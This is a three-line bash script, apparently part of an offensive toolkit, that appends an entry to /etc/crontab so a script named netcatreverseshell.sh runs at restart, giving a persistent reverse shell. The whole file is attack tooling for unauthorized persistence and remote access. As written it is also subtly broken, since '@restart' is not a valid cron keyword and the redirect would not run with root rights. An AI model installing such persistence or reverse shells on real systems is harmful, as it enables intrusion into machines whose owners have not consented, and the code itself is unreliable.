#!/bin/bash
#adds persistence.sh to crontab
sudo echo @restart sh ~/toolbag/persistence/netcatreverseshell.sh >> /etc/crontab
